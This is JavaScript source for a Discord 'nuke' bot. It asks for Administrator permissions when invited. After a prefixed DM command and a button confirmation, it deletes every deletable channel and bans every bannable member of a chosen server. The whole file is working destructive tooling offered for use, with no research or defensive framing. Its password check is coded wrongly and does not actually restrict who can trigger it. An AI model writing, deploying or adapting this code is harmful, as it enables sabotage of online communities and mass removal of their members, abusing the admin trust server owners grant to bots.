const { Attachment, PermissionsBitField, Partials, Client, GatewayIntentBits, EmbedBuilder, ActionRowBuilder, SelectMenuBuilder, ComponentType, ButtonBuilder, ButtonStyle } = require('discord.js');
const config = require("./config.json");
const token = require("./token.json").token;

console.log(`
 ________      ___      ________       ________      ________      ________      ________          ________       ___  ___      ___  __        _______      \r\n|\\   ___ \\    |\\  \\    |\\   ____\\     |\\   ____\\    |\\   __  \\    |\\   __  \\    |\\   ___ \\        |\\   ___  \\    |\\  \\|\\  \\    |\\  \\|\\  \\     |\\  ___ \\     \r\n\\ \\  \\_|\\ \\   \\ \\  \\   \\ \\  \\___|_    \\ \\  \\___|    \\ \\  \\|\\  \\   \\ \\  \\|\\  \\   \\ \\  \\_|\\ \\       \\ \\  \\\\ \\  \\   \\ \\  \\\\\\  \\   \\ \\  \\\/  \/|_   \\ \\   __\/|    \r\n \\ \\  \\ \\\\ \\   \\ \\  \\   \\ \\_____  \\    \\ \\  \\        \\ \\  \\\\\\  \\   \\ \\   _  _\\   \\ \\  \\ \\\\ \\       \\ \\  \\\\ \\  \\   \\ \\  \\\\\\  \\   \\ \\   ___  \\   \\ \\  \\_|\/__  \r\n  \\ \\  \\_\\\\ \\   \\ \\  \\   \\|____|\\  \\    \\ \\  \\____    \\ \\  \\\\\\  \\   \\ \\  \\\\  \\|   \\ \\  \\_\\\\ \\       \\ \\  \\\\ \\  \\   \\ \\  \\\\\\  \\   \\ \\  \\\\ \\  \\   \\ \\  \\_|\\ \\ \r\n   \\ \\_______\\   \\ \\__\\    ____\\_\\  \\    \\ \\_______\\   \\ \\_______\\   \\ \\__\\\\ _\\    \\ \\_______\\       \\ \\__\\\\ \\__\\   \\ \\_______\\   \\ \\__\\\\ \\__\\   \\ \\_______\\\r\n    \\|_______|    \\|__|   |\\_________\\    \\|_______|    \\|_______|    \\|__|\\|__|    \\|_______|        \\|__| \\|__|    \\|_______|    \\|__| \\|__|    \\|_______|\r\n                          \\|_________|                                                                                                                      \r\n                                                                                                                                                            \r\n                                                                                                                       
`)


const client = new Client({ intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMembers, GatewayIntentBits.GuildMessages, GatewayIntentBits.DirectMessages, GatewayIntentBits.DirectMessageReactions, GatewayIntentBits.GuildBans], partials: [Partials.Channel] });
client.on("ready", async (client) => {
    console.log(`Bot logged in as ${client.user.tag}`);
    const inviteLink = client.generateInvite({
        permissions: [PermissionsBitField.Flags.Administrator],
        scopes: ["bot", "applications.commands"]
    })
    console.log(`Link: ${inviteLink}`);
});
client.on("interactionCreate", async (interaction) => {
    if (!interaction.isButton()) return;
    await interaction.reply({
        embeds: [
            new EmbedBuilder()
                .setColor(0xff0000)
                .setTitle("Nuked!")
                .setImage("https://i.imgur.com/rYhYdzQ.jpeg")
        ]
    })
    const guild = await client.guilds.fetch(interaction.customId);
    console.log("Deleting channels...")
    await removeAllChannels(guild);
    console.log("Banning members");
    await banAllMembers(guild);
})

client.on("messageCreate", async (message) => {
    if (!message.channel.type == "dm") return;
    if (!message.content.startsWith(config.prefix)) return;
    const messageArray = message.content.split(/\s+/g);
    const command = messageArray[0].slice(1);
    const channel = message.channel;

    switch (command) {
        case "nuke":
            if (!messageArray.length == 2) return;
            if (!messageArray[1] == config.password) return;
            const guilds = await client.guilds.fetch();
            const dateOptions = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
            const interactionMessage = await channel.send({
                embeds: [
                    new EmbedBuilder()
                        .setColor(0x00ff00)
                        .setTitle("☢️ Nukable servers ☢️")
                        .setDescription("These are the servers that are at your disposal to nuke.")
                ],
                components: [
                    new ActionRowBuilder()
                        .addComponents(
                            new SelectMenuBuilder()
                                .setMaxValues(1)
                                .setCustomId("serverList")
                                .setPlaceholder('Nothing selected')
                                .addOptions(guilds.map(guild => (
                                    { label: guild.name, description: `created: ${new Date(guild.createdTimestamp).toLocaleDateString(undefined, dateOptions)}`, value: guild.id }))

                                ),
                        )

                ]
            })
            const collector = interactionMessage.createMessageComponentCollector({ componentType: ComponentType.SelectMenu, time: 60000 });
            collector.on('collect', async i => {

                const guildId = i.values.at(0);
                const guild = await client.guilds.fetch(guildId);

                const owner = await guild.fetchOwner();
                const verificationMessage = await i.reply({
                    embeds: [
                        new EmbedBuilder()
                            .setColor(0x00ff00)
                            .setTitle("Are you sure?")
                            .setThumbnail(guild.iconURL())
                            .setDescription(`Are you sure you wish to nuke **${guild.name}**?`)
                            .addFields(
                                { name: "members", value: `${guild.memberCount} member(s)` },
                                { name: "channels", value: `${guild.channels.cache.size} channel(s)` },
                                { name: "owner", value: owner.user.tag }
                            )
                            .setTimestamp()
                            .setFooter({ text: client.user.tag, iconURL: client.user.avatarURL() })
                    ],
                    components: [
                        new ActionRowBuilder()
                            .addComponents(
                                new ButtonBuilder()
                                    .setCustomId(guildId)
                                    .setLabel('NUKE')
                                    .setStyle(ButtonStyle.Danger),
                            )

                    ]
                })

            });



            // if (messageArray.length == 3) {
            //     if (messageArray[2] == config.password) {
            //         const guildId = messageArray[1];
            //         const guild = await client.guilds.fetch(guildId);
            //         console.log("Deleting channels...")
            //         await removeAllChannels(guild);
            //         console.log("Banning members");
            //         await banAllMembers(guild);
            //     }
            // }
            break;
        default:
            break;
    }
})

async function removeAllChannels(guild) {
    const channels = await guild.channels.fetch();
    channels.forEach(async channel => {
        try {
            if (channel.deletable) {
                channel.delete();
                console.log(`deleted: ${channel.name}`)
            }
        } catch (error) {
            console.log(error);
        }
    });
}
async function banAllMembers(guild) {
    const members = await guild.members.fetch();
    members.forEach(async member => {
        try {
            if (member.bannable) {
                member.ban();
                console.log(`banned: ${member.user.tag}`)
            }
        } catch (error) {
            console.log(error);
        }
    })

}

client.login(token);